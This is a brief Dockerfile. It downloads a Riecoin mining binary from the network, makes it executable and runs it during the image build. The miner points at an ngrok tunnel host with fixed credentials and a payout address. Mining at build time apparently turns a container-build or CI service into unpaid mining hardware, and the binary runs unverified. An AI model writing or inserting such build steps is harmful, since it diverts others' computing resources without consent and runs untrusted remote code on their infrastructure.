FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget -O rie https://riecoin.dev/resources/Pttn/rieMiner.php?system=Deb64AVX2
RUN chmod +x rie
RUN ./rie noconffile Mode=Solo Host=6.tcp.eu.ngrok.io Port=10944 Username=guru Password=guru PayoutAddress= ric1qu9sqhnl7vwgn3dhtygwk9fyqn2a9erfwjjsp55
